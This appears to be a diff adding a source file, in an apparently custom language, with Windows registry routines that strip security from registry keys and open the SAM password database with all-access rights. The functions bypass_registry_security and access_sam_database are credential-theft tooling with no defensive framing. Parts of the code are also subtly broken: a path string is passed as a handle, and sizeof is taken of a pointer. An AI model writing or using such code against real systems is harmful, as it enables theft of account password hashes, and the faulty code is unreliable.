@@ -1,0 +1,107 @@
+import "win_api.mf";
+
+struct RegistryKey {
+    HKEY handle;
+    ptr path;
+}
+
+struct OBJECT_ATTRIBUTES {
+    u32 length;
+    HANDLE root_directory;
+    ptr object_name;
+    u32 attributes;
+    ptr security_descriptor;
+    ptr security_quality_of_service;
+}
+
+// Advanced registry operations
+fn bypass_registry_security(ptr key_path) -> bool {
+    // Disable registry security
+    let sd = alloc 1024;  // Security descriptor
+    let sacl = alloc 1024;  // System ACL
+    
+    // Set everyone full access
+    memset(sd, 0, 1024);
+    memset(sacl, 0, 1024);
+    
+    let status = NtSetSecurityObject(
+        key_path,
+        4,  // SACL_SECURITY_INFORMATION
+        sd
+    );
+    
+    ret status == 0;
+}
+
+fn modify_registry_key(ptr path, ptr value_name, ptr data, u32 type) -> bool {
+    let key = RegistryKey {
+        handle: null,
+        path: path
+    };
+    
+    // Create object attributes
+    let oa = OBJECT_ATTRIBUTES {
+        length: sizeof(OBJECT_ATTRIBUTES),
+        root_directory: null,
+        object_name: path,
+        attributes: 64,  // OBJ_CASE_INSENSITIVE
+        security_descriptor: null,
+        security_quality_of_service: null
+    };
+    
+    // Open/create key with direct syscall
+    let status = NtOpenKey(
+        ref key.handle,
+        0xF003F,  // All access
+        ref oa
+    );
+    
+    if status != 0 {
+        ret false;
+    }
+    
+    // Set value
+    status = NtSetValueKey(
+        key.handle,
+        value_name,
+        0,
+        type,
+        data,
+        sizeof(data)
+    );
+    
+    ret status == 0;
+}
+
+// SAM database direct access
+fn access_sam_database() -> ptr {
+    let sam_path = "\\Registry\\Machine\\SAM";
+    
+    // Bypass security
+    if !bypass_registry_security(sam_path) {
+        ret null;
+    }
+    
+    // Open SAM with direct syscall
+    let key = alloc sizeof(HANDLE);
+    let oa = OBJECT_ATTRIBUTES {
+        length: sizeof(OBJECT_ATTRIBUTES),
+        root_directory: null,
+        object_name: sam_path,
+        attributes: 64,  // OBJ_CASE_INSENSITIVE
+        security_descriptor: null,
+        security_quality_of_service: null
+    };
+    
+    let status = NtOpenKey(
+        key,
+        0xF003F,  // All access
+        ref oa
+    );
+    
+    if status != 0 {
+        ret null;
+    }
+    
+    ret key;
+} 
